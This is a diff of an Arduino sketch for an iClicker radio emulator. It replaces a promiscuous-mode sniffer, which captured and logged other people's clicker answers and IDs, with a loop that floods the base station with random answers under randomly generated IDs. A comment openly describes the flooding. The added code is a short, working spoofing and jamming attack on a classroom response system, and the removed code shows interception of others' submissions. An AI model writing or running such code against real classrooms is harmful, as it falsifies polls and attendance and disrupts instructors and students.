@@ -1,5 +1,4 @@
 #include <iClickerEmulator.h>
-#include <RingBufCPP.h>
 #include <string.h>
 #include <Arduino.h>
 
@@ -9,53 +8,31 @@
 #define CSN PA4 // This is 8 on adafruit feather. I think it's the NSS (slave select) pin? In fact, I'm almost sure of it.
 /* END THINGS YOU MUST UPDATE */
 
-#define MAX_BUFFERED_PACKETS 20
-#define SEND_ACKS true
-
 iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);
-RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> recvBuf;
 
-//forward declaration
-void recvPacketHandler(iClickerPacket *recvd);
 
+// This will flood base station with random answers under random ids
+// Use at your own risk...
 
 void setup()
 {
+  pinMode(LED_BUILTIN, OUTPUT);
     Serial.begin(9600);
-    clicker.begin(iClickerChannels::AA);
-    // enter promiscouse mode on sending channel
-    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
-    delay(1000);
-    Serial.println("Started promiscous");
+    clicker.begin(iClickerChannels::AA); //set channel to AA
     //clicker.dumpRegisters();
 }
 
 
 void loop()
 {
-  char tmp[50];
-  iClickerPacket r;  
+  digitalWrite(LED_BUILTIN, LOW);//on
+  uint8_t id[4];
+  iClickerEmulator::randomId(id);
+  iClickerAnswer ans = clicker.randomAnswer();
+  clicker.submitAnswer( id, ans, false, 100);
 
-  //see if there is a pending packet, check if its an answer packet
-  while (recvBuf.pull(&r) && r.type == PACKET_ANSWER) {
-    uint8_t *id = r.packet.answerPacket.id;
-    char answer = iClickerEmulator::answerChar(r.packet.answerPacket.answer);
-    snprintf(tmp, sizeof(tmp), "Captured: %c (%02X, %02X, %02X, %02X) \n", answer, id[0], id[1], id[2], id[3]);
-    Serial.println(tmp);
-  }
-
-  delay(100);
-}
+  digitalWrite(LED_BUILTIN, HIGH);//off
+  delay(10);
 
 
-void recvPacketHandler(iClickerPacket *recvd)
-{
-    if (SEND_ACKS && recvd->type == PACKET_ANSWER) {
-      clicker.acknowledgeAnswer(&recvd->packet.answerPacket, true);
-      // restore the frequency back to AA and go back to promiscous mode
-      clicker.setChannel(iClickerChannels::AA);
-      clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
-    }
-
-    recvBuf.add(*recvd);
 }
